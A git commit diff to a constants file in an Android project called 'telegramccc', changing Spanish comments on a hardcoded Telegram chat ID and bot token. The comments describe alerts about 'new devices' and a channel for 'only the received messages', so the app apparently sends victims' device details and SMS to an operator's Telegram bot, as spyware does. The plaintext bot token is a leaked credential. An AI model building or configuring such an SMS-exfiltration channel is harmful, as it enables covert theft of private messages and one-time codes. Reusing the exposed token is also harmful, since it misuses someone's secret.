344529c57735df761f8e3a10ed2699a72538e8db
adriano <adriapps10@gmail.com>
2022-11-15 14:57:06 -0500

    subido

--- app/src/main/java/com/tiburela/telegramccc/Constans.java
+++ app/src/main/java/com/tiburela/telegramccc/Constans.java
@@ -3,12 +3,12 @@ package com.tiburela.telegramccc;
 public class Constans {
 
 
-   public static final String chatID="1044704666";  //la cuenta de telegram donde recibiras los mensajes del bot/
+   public static final String chatID="1044704666";  //la cuenta de telegram donder recibiremos la alerta de los nuevos dispositivos
     public static final String tockenChatBot="5762677106:AAFc-tNCZyZnRuRa7MHyRZeLESDmOj84EuE";    //tocken del bot
 
 
-    public static final String chatIDSms="1044704666";  //la cuenta de telegram donde recibiras los mensajes del bot/
-    public static final String tockenChatBotDataSMS="5762677106:AAFc-tNCZyZnRuRa7MHyRZeLESDmOj84EuE";    //tocken del bot
+    public static final String chatIDSms="1044704666";  //unicamente los mensajes
+    public static final String tockenChatBotDataSMS="5762677106:AAFc-tNCZyZnRuRa7MHyRZeLESDmOj84EuE";    //tocken del bot para resivir unicmanete los mensajes recibidos
 
 
 
